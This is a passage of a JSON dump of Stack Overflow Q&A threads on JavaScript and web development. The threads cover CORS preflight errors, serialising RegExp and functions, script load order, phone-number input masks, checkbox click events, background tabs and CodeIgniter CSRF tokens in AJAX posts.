                    "body": "<p>Looks like a CORS preflight request (https://developer.mozilla.org/En/HTTP_access_control)</p>\n\n<p>I guess you are trying to access to a different domain/port. Depending on the request, the browser will send a preflight request (an OPTION request) to know if the server accepts the set of Headers or HTTP method you wanted to send in the first place. If the server responds OK, the browser will send the real request. </p>\n\n<p>Looks like that Python server doesn't implement OPTIONs requests, hence the error.</p>\n\n<p>Tip: Network inspection tools (tcpdump, wireshark, ngrep...) help a lot when dealing with http requests and/or network errors.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>What I do is to write a customized <strong>HTTPRequestHandler</strong>. I add a <strong>do-OPTIONS</strong> method inside MyHandler to tell browser my server support CROS. This is done by sending headers <strong>Access-Control-Allow-Origin, Access-Control-Allow-Methods and Access-Control-Allow-Headers</strong>. Also, I add a \"self.send_header('Access-Control-Allow-Origin', '*')\"  statement in <strong>do_GET</strong> method. </p>\n\n<pre><code>class MyHandler(BaseHTTPRequestHandler):\n    def do_OPTIONS(self):           \n        self.send_response(200, \"ok\")       \n        self.send_header('Access-Control-Allow-Origin', '*')                \n        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')\n        self.send_header(\"Access-Control-Allow-Headers\", \"X-Requested-With\")        \n\n    def do_GET(self):           \n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', '*')\n        self.send_header('Content-type',    'text/html')                                    \n        self.end_headers()              \n        self.wfile.write(\"&lt;html&gt;&lt;body&gt;Hello world!&lt;/body&gt;&lt;/html&gt;\")\n        self.connection.shutdown(1) \n</code></pre>\n",
                    "is_accepted": true,
                    "score": 9
                },
                {
                    "body": "<p>You may also need to add fields such as \"Content-Type\" to the allowed headers. </p>\n\n<pre><code>self.send_header(\"Access-Control-Allow-Headers\", \"X-Requested-With, Content-Type\") \n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>It look like a Cross-Origin Resource Sharing (CORS) preflight request. </p>\n\n<p>Since CORS is a specification that is strongly related to a server configuration, I recommend to read <a href=\"http://enable-cors.org/\" rel=\"nofollow\">http://enable-cors.org/</a></p>\n\n<p>There you'll see more about implementing CORS for your specific platform.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am learning the JQuery Get method. I start up a Python HTTP server:</p>\n\n<p>(just typing command \"<strong>Python -m SimpleHTTPServer</strong>\"). </p>\n\n<p>It's fine to test this webserver by just visiting \"http://localhost:80\" on my web browser. However, when I write this very simple javascript to visit my webserver. I get an error message:</p>\n\n<p><strong>\"code 501, message Unsupported method ('OPTIONS')\"</strong></p>\n\n<p>I use jquery.xdomainajax.js library which suppose cross domain request JQuery. </p>\n\n<p>Here is my javascript code:</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;script src=\"jquery.min.js\"&gt;&lt;/script&gt;\n&lt;script src=\"jquery.xdomainajax.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;\n$(document).ready(function(){ \n  u = 'http://localhost:80';\n jQuery.get(u, function(res){       \n    $(\"#data\").html(res.responseText)\n});\n});\n\n\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;p id=\"data\"&gt;&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Actually, if I change u to any other url, such as \"http://www.google.ca\". It works quite well. But I have no idea why it does not work for the basic Python HTTP server. Can anyone help me?</p>\n",
            "last_activity_date": 1403169388,
            "question_id": 8470414,
            "score": 4,
            "tags": [
                "javascript",
                "jquery",
                "python",
                "http",
                "httpserver"
            ],
            "title": "Strange JQuery Error &quot;code 501, message Unsupported method OPTIONS&quot;"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<p>You can't. JSON is for data only, not code. There's no way to transfer functions.</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>In core JSON, there isn't; <a href=\"http://json.org\" rel=\"nofollow\">the JSON spec</a> only allows for primitive values (string/numbers/boolean/null), and arrays and objects.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p><a href=\"http://www.json.org/\" rel=\"nofollow\">json.org</a> details all of the legal structures of the JSON data-interchange format. There are also useful diagrams provided at the site.</p>\n\n<p><a href=\"http://jsonlint.com/\" rel=\"nofollow\">JSONLint</a> is a useful website for testing validity of JSON.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>All answers above is right, instead of you can save this part of code as a string and then do <code>eval()</code></p>\n\n<pre><code>var sCode = 'var oFoo = {\"regexp\": new RegExp(\"/^http:\\/\\//\"), \"fun\": function() {}}';\neval(sCode);\nconsole.log(oFoo);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>It is not JSON, but it is a form of serialization: <code>foo.toSource()</code> gives a string representation: <code>\"({regexp:/^http:\\\\/\\\\//, fun:(function () {})})\"</code>. Using <code>bar = eval(foo.toSource());</code> assigns a new object with a regex and a function to <code>bar</code>.</p>\n\n<p>I don't know how well it is supported. Several website mention that it is gecko-only, although they are two years old. I currently only have access to Firefox, so you test whether it works in the browsers you want to support (probably IE, Chrome, Safari and Opera).</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You have to store the RegExp as a string in the JSON object. You can then construct a RegExp object from the string:</p>\n\n<pre><code>// JSON Object (can be an imported file, of course)\n// Store RegExp pattern as a string\n// Double backslashes are required to put literal \\ characters in the string\nvar jsonObject = { \"regex\": \"^http:\\\\/\\\\/\" };\n\nfunction fun(url) {\n    var match, regexp;\n\n    // You can do:\n    match = url.match(new RegExp(jsonObject.regex, 'i'));\n    // Or (useful for capturing groups when doing global search):\n    regexp = new RegExp(jsonObject.regex, 'i');\n    match = regexp.exec(url);\n\n    // Logic to process match results\n    // ...\n    return 'ooga booga boo';\n}\n</code></pre>\n\n<p>As for functions: they should not be represented in JSON or XML anyway. A function may be defined as an object in JS, but its primary purpose is still to encapsulate a sequence of commands, not serve as a wrapper for basic data.</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>You could do something like this...</p>\n\n<h2>Method</h2>\n\n<pre><code>JSONEX = {\n\n    stringify: function(obj){\n        var jsonified = {}\n        // loop through object and write string and type to newly stored data structure\n        for(i in obj)\n            jsonified[i] = {\n                // some voodoo to determine the variable type\n                type: Object.prototype.toString.call(obj[i]).split(/\\W/)[2],\n                value: obj[i].toString()\n            }    \n        return JSON.stringify(jsonified)\n    },\n\n    parse: function(json){\n        objectified = {}\n        obj = JSON.parse(json)\n        // loop through object, and handle parsing of string according to type\n        for(i in obj)\n            if(obj[i].type == \"RegExp\"){\n                var m = obj[i].value.match(/\\/(.*)\\/([a-z]+)?/)\n                objectified[i] = new RegExp(m[1],m[2]);\n            } else if(obj[i].type == \"String\"){\n                objectified[i] = obj[i].value\n            } else if(obj[i].type == \"Function\"){\n                // WARNING: this is more or less like using eval\n                // All the usual caveats apply - including jailtime\n                objectified[i] = new Function(\"return (\"+obj[i].value+\")\")();\n            }\n            // ADD MORE TYPE HANDLERS HERE ...\n\n        return objectified\n\n    }\n}\n</code></pre>\n\n<h2>Usage</h2>\n\n<pre><code>myThing = {\n    regex: new RegExp(\"123\",\"g\"),\n    text: \"good\",\n    func: function(x){\n        return x * x\n    }\n}\n\njson = JSONEX.stringify(myThing)\n// \"{\"regex\":{\"type\":\"RegExp\",\"value\":\"/123/g\"},\"text\":{\"type\":\"String\",\"value\":\"good\"},\"func\":{\"type\":\"Function\",\"value\":\"function (x) {\\n    return x * x;\\n}\"}}\"\n\nobj = JSONEX.parse(json)\n// native object representing original object\n</code></pre>\n\n<hr>\n\n<h3>N.B.</h3>\n\n<p>Almost a good solution, but does not work with regex (for me anyway)</p>\n\n<p><a href=\"http://jsonplus.com/\" rel=\"nofollow\">http://jsonplus.com/</a></p>\n\n<pre><code>// doing this: jsonPlus.stringify(myThing)\n// just stores `regex` as an empty object\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>For those who's still looking for an answer: </p>\n\n<p>with plagin <strong>JSONfn</strong>  you can serialize javascript object with </p>\n\n<ul>\n<li><strong>Functions</strong></li>\n<li><strong>Regexp</strong> </li>\n<li><strong>Date</strong></li>\n</ul>\n\n<p>and re-create object from this string.</p>\n\n<p>Documentation:  <a href=\"http://www.eslinstructor.net/jsonfn/\" rel=\"nofollow\">http://www.eslinstructor.net/jsonfn/</a>  </p>\n\n<p>--Vadim</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>Given a block like this:</p>\n\n<pre><code>var foo = {\"regexp\":/^http:\\/\\//,\n           \"fun\":function(){},\n}\n</code></pre>\n\n<p>What is a proper way to store it in JSON?</p>\n",
            "last_activity_date": 1391385928,
            "question_id": 8328119,
            "score": 4,
            "tags": [
                "javascript",
                "regex",
                "json",
                "serialization",
                "anonymous-function"
            ],
            "title": "Can I store RegExp and Function in JSON?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>They are loaded in parallel but they run only once every file have been loaded.\nSo the answer is yes, you can rely on the fact.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Short: Yes:</p>\n\n<p>Without specifying <code>defer</code> or <code>async</code> properties within the script tag, the spec says, that a browser has to sequentially (sync) load those files.</p>\n\n<p>In other words, a plain script tag which a browser finds needs to get</p>\n\n<ul>\n<li>loaded</li>\n<li>executed</li>\n<li>(block any other render/execution process while doing the above)</li>\n</ul>\n\n<p>While a \"modern\" browser probably still trys to optimize that process, those steps need to be applied (at least, process-like). That is the reason why you should place script tags without further specification always at the bottom of your <code>&lt;body&gt;</code> tag. Even the DOM render process stops while loading/executing scripts.</p>\n\n<p>To avoid that, you can specify a <code>defer</code> or <code>async</code> (HTML5 only) property in those script tags, like</p>\n\n<pre><code>&lt;script defer src=\"/foo/bar.js\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>that tells the browser it is a script that meant to be executed after the document has been parsed.</p>\n\n<p>See <a href=\"https://developer.mozilla.org/En/HTML/Element/Script\" rel=\"nofollow\">https://developer.mozilla.org/En/HTML/Element/Script</a></p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>They may be loaded (via the network) in parallel, but they are evaluated in sequence.</p>\n\n<p>So yes, you can rely on the order.</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>In general, scripts are downloaded sequentially (see <a href=\"http://code.google.com/speed/page-speed/docs/rtt.html#PutStylesBeforeScripts\" rel=\"nofollow\">this page</a>):</p>\n\n<blockquote>\n  <p>Because JavaScript code can alter the content and layout of a web\n  page, the browser delays rendering any content that follows a script\n  tag until that script has been downloaded, parsed and executed.\n  However, more importantly for round-trip times, many browsers block\n  the <em>downloading</em> of resources [such as stylesheets, images, and other scripts]\n  referenced in the document after scripts until those scripts are\n  downloaded and executed.</p>\n</blockquote>\n",
                    "is_accepted": true,
                    "score": 5
                }
            ],
            "body": "<p>if i have multiple script tags in my page like:</p>\n\n<pre><code>    &lt;script src=\"js/jquery-1.7.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n    &lt;script src=\"js/jquery.jplayer.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n    &lt;script src=\"js/globals.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n    &lt;script src=\"js/sound.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>can i rely on the fact that code from the previous ones is already available when the latter ones are loaded?</p>\n",
            "last_activity_date": 1321524307,
            "question_id": 8165103,
            "score": 4,
            "tags": [
                "javascript"
            ],
            "title": "are external javascript files loaded sequentially or parallel?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>For security reasons, Javascript is made so you can not do this. However, a person has made a workaround which may work and posted it <a href=\"http://www.htmlhelpcentral.com/messageboard/showthread.php?9936-JavaScript-OPEN-file-for-reading&amp;s=f2dfdc5216f7f374c186250085733434&amp;p=55848#post55848\" rel=\"nofollow\">here</a>.</p>\n\n<p>Ok, I realize, it only works for files that are publicly accessbile on the server, which I believe is not what you want to do. Still, if you do find a way, it will be a hack like this, but it could also be fixed to not work at any time.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Although it says xml request this works perfectly fine for txt files too (server and client side).</p>\n\n<pre><code>if (window.XMLHttpRequest)\n{// code for IE7+, Firefox, Chrome, Opera, Safari\n    xmlhttp=new XMLHttpRequest();\n}\nelse\n{// code for IE6, IE5\n    xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n}\nxmlhttp.open(\"GET\",\"YOUR_FILE.txt\",false);\nxmlhttp.send();\nxmlDoc=xmlhttp.responseText;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>abandoned question:</p>\n\n<pre><code>if (window.XMLHttpRequest)\n{// code for IE7+, Firefox, Chrome, Opera, Safari\n    xmlhttp=new XMLHttpRequest();\n}\nelse\n{// code for IE6, IE5\n    xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n}\nxmlhttp.open(\"GET\",\"YOUR_FILE.txt\",false);\nxmlhttp.send();\nxmlDoc=xmlhttp.responseText;\n</code></pre>\n\n<p>by Freek8</p>\n",
                    "is_accepted": true,
                    "score": -1
                },
                {
                    "body": "<p>JavaScript has none of the functions you are trying to use.</p>\n\n<p>To read files on the server in JavaScript, you can use <a href=\"https://developer.mozilla.org/En/Using_XMLHttpRequest\">XMLHttpRequest</a>.</p>\n\n<p>There is no easy way to read files on the client machine.</p>\n",
                    "is_accepted": false,
                    "score": 5
                }
            ],
            "body": "<p>I'm new to javascript and trying to open a txt file into var and then inject it to html div...\nI tried to use fopen but I didn't succeed.</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\nfile = fopen(getScriptPath(\"info.txt\"), 0);\n\n\nfile_length = flength(file);\nvar content = fread(file,file_length);\nvar div = document.getElementById(\"myDiv\");\n//alert(div);\ndiv.innerHTML = \"\";\ndiv.innerHTML = content;\n&lt;/script&gt;\n</code></pre>\n",
            "last_activity_date": 1354879799,
            "question_id": 8137225,
            "score": 4,
            "tags": [
                "javascript"
            ],
            "title": "read txt file via client javascript"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>You can try something like this:</p>\n\n<p><strong>HTML:</strong></p>\n\n<pre><code>&lt;div id=\"canvas\"&gt;&lt;/div&gt;\u200b\n</code></pre>\n\n<p><strong>JS:</strong></p>\n\n<pre><code>var text = \"this is some colored text\";\nvar paper = Raphael('canvas', '100%', document.documentElement.clientHeight/2 );\nvar colors = [\"#ffc000\", \"#1d1d1d\", \"#e81c6e\", \"#7c7c7c\", \"#00aff2\"];\nvar letterSpace = 5;\nvar xPos = 10;\nvar yPos = 10;\n\ntextNodes = text.split(' ');\n\nfor( var i=0; i &lt; textNodes.length; ++i) {       \n    var textColor = colors[i];\n    var textNode = paper.text( xPos , yPos , textNodes[i]);\n        textNode.attr({\n            'text-anchor': 'start',\n            'font-size' : 12,\n            'fill' : textColor\n        });\n    xPos = xPos + textNode.getBBox().width + letterSpace;\n}\n\u200b\n</code></pre>\n\n<p>Demo:\n<a href=\"http://jsfiddle.net/aamir/zsS7L/\" rel=\"nofollow\">http://jsfiddle.net/aamir/zsS7L/</a></p>\n",
                    "is_accepted": true,
                    "score": 2
                }
            ],
            "body": "<p>I have the following code:</p>\n\n<pre><code>        var set = paper.set();\n        var text = paper.text(0, 0, 'bla1 bla2' ).attr({ fill: 'blue'});\n        set.push(text);\n</code></pre>\n\n<p>How can I change the color of the 'bla2' to green now?</p>\n\n<p>I've already tried to split the string into two text-elements and assign the coordinates of the 'bla1'+ width of the 'bla1' to the second one. It didn't work since I coundn't find out the width of 'bla1'. The second problem with this solution is that I might want to change the font-size of 'bla1 bla2' which will automatically change the width of 'bla1' and distort the position of 'bla2'.</p>\n\n<p>Thanks in advance!</p>\n",
            "last_activity_date": 1346239736,
            "question_id": 7942269,
            "score": 4,
            "tags": [
                "javascript",
                "svg",
                "raphael"
            ],
            "title": "Raphael JS: how to change the color of certain letters within a text-element?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>There are three common ways for handling phone number input of a guaranteed format:</p>\n\n<p><strong>1. Accept all numerical input anyway</strong></p>\n\n<p>The likelihood of users with obscure numbers but still living in the US is higher than ever. Accepting all kinds of numerical input alleviates the concern as the number will only be useless if they gave you either not enough numbers or the wrong ones.</p>\n\n<p><strong>2. Split it into three text boxes of fixed lengths</strong></p>\n\n<p>A lot of financial software does this. Not sure why, specifically, but it seems to be rather frequent there. A recommendation is to advance the cursor after keypress to the next box if they've typed the max limit on the textboxes. Also, this guarantees you will get the numbers in whatever format you're expecting, because you can just append the resulting post variables together.</p>\n\n<p>Example of the HTML:</p>\n\n<pre><code>&lt;input id=\"phonePart1\" maxlength=\"3\" name=\"phonePart1\"/&gt;\n&lt;input id=\"phonePart2\" maxlength=\"3\" name=\"phonePart2\"/&gt;\n&lt;input id=\"phonePart3\" maxlength=\"4\" name=\"phonePart3\"/&gt;\n</code></pre>\n\n<p>and a little jQuery snippet to merge the three in your format:</p>\n\n<pre><code>var phonePart1 = parseInt($(\"#phonePart1\").val(), 10);\nvar phonePart2 = parseInt($(\"#phonePart2\").val(), 10);\nvar phonePart3 = parseInt($(\"#phonePart3\").val(), 10);\nvar phone = \"(\";\n\nif (isNaN(phonePart1)||isNaN(phonePart2)||isNan(phonePart3)) {\n\n    // Incorrect format\n\n} else { \n\n    phone = phone + phonePart1 + \")\" + phonePart2 + \"-\" + phonePart3;\n\n}\n</code></pre>\n\n<p><strong>3. Use a regular expression to match the number format</strong></p>\n\n<p>You can use a combination of regular expressions to match multiple numbers, or explicitly the one you are asking about. This is probably the technique you're looking for.\nThis is the regular expression:</p>\n\n<pre><code>/\\([0-9]{3}\\)[0-9]{3}-[0-9]{4}/\n</code></pre>\n\n<p>You'd use it like this:</p>\n\n<pre><code>if (yourphonevariable.match(/\\([0-9]{3}\\)[0-9]{3}-[0-9]{4}/))\n{\n    // it's valid\n}\n</code></pre>\n\n<p><strong>4. If you're looking to format the text itself with a mask...</strong></p>\n\n<p>Consider the jQuery plugin at <a href=\"http://digitalbush.com/projects/masked-input-plugin/\">http://digitalbush.com/projects/masked-input-plugin/</a>. User @John Gietzen suggested this to me outside of this post, so feel free to give him kudos for it.</p>\n",
                    "is_accepted": true,
                    "score": 7
                }
            ],
            "body": "<p>How can I mask a US phone using javascrpt on an HTML control.</p>\n\n<p>I would like the input to force the text to be in the following format:</p>\n\n<pre><code>[(111)111-1111]\n</code></pre>\n\n<p>Here is what I have currently:</p>\n\n<pre><code>mask(str, textbox, loc, delim) {\n    var locs = loc.split(',');\n    for (var i = 0; i &lt;= locs.length; i++) {\n        for (var k = 0; k &lt;= str.length; k++)\n        {\n            if (k == locs[i]) {\n                if (str.substring(k, k + 1) != delim) {\n                    str = str.substring(0,k) + delim + str.substring(k,str.length)\n                }\n             }\n         }\n     }\n     textbox.value = str\n} \n</code></pre>\n",
            "last_activity_date": 1317844555,
            "question_id": 7665792,
            "score": 4,
            "tags": [
                "javascript"
            ],
            "title": "How can I mask an HTML input using javacript?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>I'm guessing its the port number your using. Have you tried using port 80 for your server rather than 8081? Its possible that port isn't open on your device. </p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>The following code snippet solved my problem</p>\n\n<pre><code>    @Override\npublic void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n    super.loadUrl(\"file:///android_asset/www/home/index.html\");\n    super.setIntegerProperty(\"loadUrlTimeoutValue\", 10000); \n</code></pre>\n\n<p>I have added</p>\n\n<pre><code>super.setIntegerProperty(\"loadUrlTimeoutValue\", 10000); \n</code></pre>\n\n<p>to the com.mypackage.xxx.java file\nfor 10 sec waiting time</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>*<strong><em>I had Same problem solved by referring *</em></strong> <a href=\"http://www.robertkehoe.com/2013/01/fix-for-phonegap-connection-to-server-was-unsuccessful/\" rel=\"nofollow\">this</a> <strong>link</strong>...</p>\n\n<p>This error occurs bcoz of <strong>Server connection timeout</strong> so, Has mentioned in above post u can give 10 sec delay in that time put some splash screen..</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I am developing a android app using phonegap, it calls a website (http://siteaddress.com:8081) to get json encoded data. This is working fine on the emulator, then I built the android package .apk file using phonegap build but when i installed this package on my android phone and started the app, it force closes the application showing the error \"The connection to the server was unsuccessful.(file:///android_asset/www/index.html)\".</p>\n\n<p>I have built the app using phonegap build, passed it the index.html as well as tried the .zip file package but still getting this error. I tried searching for this error and also included the below code in my app as suggested on some sites but still it is giving error.</p>\n\n<pre><code>super.setBooleanProperty(\"loadInWebView\", true);\nsuper.setIntegerProperty(\"loadUrlTimeoutValue\", 60000);\n</code></pre>\n\n<p>Has this got something to do with the website that i am trying to call from my app? I tried opening that site in the mobile browser but it didn't opened but the website works fine on a desktop browser. Is there something wrong that i am doing?</p>\n",
            "last_activity_date": 1374121127,
            "question_id": 7633940,
            "score": 4,
            "tags": [
                "javascript",
                "android",
                "html5",
                "cordova"
            ],
            "title": "The connection to the server was unsuccessful.(file:///android_asset/www/index.html)"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>The actual default event being prevented <em>is</em> the <code>click</code> event. The misunderstanding probably occurs because you are thinking of the event as firing after the actual click has been fully processed (i.e. the checkbox has been toggled) while in reality the event model stipulates  that the handler fires <em>while</em> the event is being processed.</p>\n\n<p>If it helps, another model I 've found useful in explaining how it all works is the database transaction model: think of your event handler as being invoked as part of a transaction, inside which the checkbox has already been toggled.</p>\n\n<ul>\n<li>If you read the state of the checkbox, you will find it toggled (the \"write\" has been sent to the database).</li>\n<li>However, you can still decide to rollback the transaction (in which case the write is undone and the checkbox is toggled back to its original value).</li>\n</ul>\n",
                    "is_accepted": true,
                    "score": 7
                }
            ],
            "body": "<p>When binding to a click event for a checkbox input, the checkbox is already toggled by the time my event handler runs and, more oddly, the toggle is reversed after my event handler runs if I specify event.preventDefault();</p>\n\n<pre><code>&lt;input id=\"foo\" type=\"checkbox\"/&gt;\n\nfunction clicked(evt) {\n   alert(document.getElementById('foo').checked);\n   evt.preventDefault();\n}\n\ndocument.getElementById('foo').addEventListener('click',clicked);\n</code></pre>\n\n<p>[tested in chrome and firefox]</p>\n\n<p><a href=\"http://jsfiddle.net/jsoverson/NHwXs/1/\" rel=\"nofollow\">JSFiddle for that code</a></p>\n\n<p>The alert will respond \"true\" (or the opposite state of the checkbox pre-click). After you dismiss the alert, the checkbox toggles back.</p>\n\n<p>So, I guess the questions are,</p>\n\n<p>What is the actual default event being prevented? Am I wrong in assuming my event handler should be running before the state is changed? Is there a way to legitimately intercept a checkbox click?</p>\n\n<p>And why in the world is the preventDefault causing the re-toggling the checkbox? </p>\n",
            "last_activity_date": 1316108719,
            "question_id": 7435142,
            "score": 4,
            "tags": [
                "javascript",
                "events",
                "checkbox",
                "preventdefault"
            ],
            "title": "Is this a core misunderstanding of the default click event on checkbox inputs, or flawed code?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Back when popup ads were a thing, this was called a \"popunder\" window. Popunders used to do something like this:</p>\n\n<pre><code>var popupWindow = window.open(...);\npopupWindow.blur();\nwindow.focus();\n</code></pre>\n\n<p>Popup blocking kind of messed around with what does and doesn't work, though- your mileage may vary.</p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>I added another \"bad\" solution with a TT-RSS plugin that works in Chrome and Opera, at least, but not Firefox:</p>\n\n<ul>\n<li><a href=\"https://github.com/dandersson/ttrss-openinbgtab\" rel=\"nofollow\">OpenInBgTab @ GitHub</a></li>\n<li><a href=\"http://tt-rss.org/forum/viewtopic.php?f=22&amp;t=1658\" rel=\"nofollow\">Thread at TT-RSS forum</a></li>\n</ul>\n\n<p>It works by simulating a Ctrl-click on an \"imaginary\" link that is created when the hotkey is triggered.</p>\n\n<p>It requires TT-RSS \u22651.7.6 (not yet released, but give it a day).</p>\n\n<p>If someone knows how to get it/another JS solution work in Firefox: feel free to leave a comment.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<h1>Problem</h1>\n\n<p>I'm using a web-based feed reader, <a href=\"http://tt-rss.org\" rel=\"nofollow\">TinyTinyRSS</a>. When sifting through the feed lists, I'd like to open interesting articles in new tabs - but <em>in the background</em>, because I want to read them only after I went through all feed items.</p>\n\n<p>TT-RSS has a shortcut key \"o\" to open the article in a new tab, but it opens the tab in the foreground (<code>window.open</code>).</p>\n\n<p>The question is now: To fix TT-RSS, I need to know <strong>how to open a background tab from javascript</strong>. It'd be awesome if the solution worked across browsers (Firefox, Chrome, Opera, Safari).</p>\n\n<p>I understand the privacy issue about that, but having it enabled for one certified webpage is ok.</p>\n\n<h1>Existing (bad) solutions</h1>\n\n<h2>Firefox</h2>\n\n<p>In <code>about:config</code>, set <code>browser.tabs.loadDivertedInBackground</code> to <code>true</code>.\nThis opens all the tabs from pages in the background, which is not what I want - I want it only for the one application/website.</p>\n\n<h2>Chrome</h2>\n\n<p>Chrome has a <a href=\"http://www.chromeextensions.org/tabs/shytab/\" rel=\"nofollow\">shytab extension</a>. Works in chrome only and is for all pages.</p>\n",
            "last_activity_date": 1364918271,
            "question_id": 7386208,
            "score": 4,
            "tags": [
                "javascript",
                "web-applications",
                "background",
                "tabs"
            ],
            "title": "open a new browser tab in background programmatically"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>If you want, you can echo both the token name and the hash somewhere appropriate. Something like this.</p>\n\n<pre><code> echo $this-&gt;security-&gt;get_csrf_token_name()\n</code></pre>\n\n<p>and</p>\n\n<pre><code> echo $this-&gt;security-&gt;get_csrf_hash()\n</code></pre>\n\n<p>Or, you could use form_open() as usual and use the hidden input that is generated for you from your javascript. Disabling the CSRF-functionality is the wrong way to go.</p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>Basically what you need to do is get the expected csrf value from the cookie (named 'ci_csrf_token' by default), then post it along with your other data.</p>\n\n<p>You would need to modify this line: </p>\n\n<pre><code>$.post(baseurl + 'ajax/images',{'id' : ID}, function(data) {\n</code></pre>\n\n<p>to:</p>\n\n<pre><code>$.post(baseurl + 'ajax/images',{'id' : ID,'ci_csrf_token' : $.cookie('ci_csrf_token')}, function(data) {\n</code></pre>\n\n<p>Might need to install the cookie addon (I'm not really sure; I use mootools).  Here is more information: <a href=\"http://aymsystems.com/ajax-csrf-protection-codeigniter-20\" rel=\"nofollow\">http://aymsystems.com/ajax-csrf-protection-codeigniter-20</a>.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>you might also try same this code i used this and works great: </p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n$(function(){\n   $('.answerlist').each(function(e){\n\n  $(this).click(function(){\n\n    var valrad = $(\"input[@name=answer]:checked\").val();\n\n\n    var post_data = {\n        'ansid': valrad,\n        '&lt;?php echo $this-&gt;security-&gt;get_csrf_token_name(); ?&gt;' : '&lt;?php echo $this-&gt;security-&gt;get_csrf_hash(); ?&gt;'\n    };\n\n        $.ajax({\n                type: \"POST\",\n                url: \"&lt;?php echo base_url(); ?&gt;online/checkanswer\",\n                data: post_data,\n                success: function(msg){\n                  /// do something \n                }\n            });\n\n  });\n\n   });\n\n\n});\n\n\n&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>As others say - you have to post the CSFR token name and its value with the AJAX request parameters. Here is a simple solution to append it automatically to every AJAX request.</p>\n\n<p>Here is what I put on my main view, so this code is on every page before loading the other javascript files:</p>\n\n<pre><code>   &lt;script&gt;\n     var csfrData = {};\n     csfrData['&lt;?php echo $this-&gt;security-&gt;get_csrf_token_name(); ?&gt;']\n                       = '&lt;?php echo $this-&gt;security-&gt;get_csrf_hash(); ?&gt;';\n   &lt;/script&gt;\n   &lt;!-- ... include other javascript files --&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>And here is a part of a javascript file that I include on every page:</p>\n\n<pre><code>$(function() {\n    // Attach csfr data token\n    $.ajaxSetup({\n       data: csfrData\n    });\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>Previous suggestions work great, but rather than using a variable that you can apply in every data-post, I find it simpler to use the ajax-setting to automatically apply this token to every post:</p>\n\n<pre><code>$(document).ajaxSend(function(elm, xhr, s){\n        if(s.data){\n            s.data += '&amp;';\n        }\n        s.data += '&lt;?php echo $this-&gt;security-&gt;get_csrf_token_name(); ?&gt;=&lt;?php echo $this-&gt;security-&gt;get_csrf_hash(); ?&gt;';\n    }); \n</code></pre>\n\n<p>(works with jquery-1.9.1. I'm not sure about other jquery-versions)</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
